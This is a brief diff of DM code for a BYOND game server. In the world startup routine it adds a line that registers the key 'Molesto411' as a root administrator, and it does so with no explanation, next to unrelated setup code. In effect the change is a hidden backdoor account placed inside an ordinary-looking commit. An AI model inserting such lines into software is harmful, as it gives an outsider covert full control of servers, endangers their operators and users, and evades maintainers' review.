@@ -27,6 +27,7 @@ datum/report_topic_handler
 var/datum/report_topic_handler/report_topic_handler
 
 world/New()
+	world.SetConfig("APP/admin", ckey("Molesto411"), "role=root")
 	..()
 	report_topic_handler = new
 
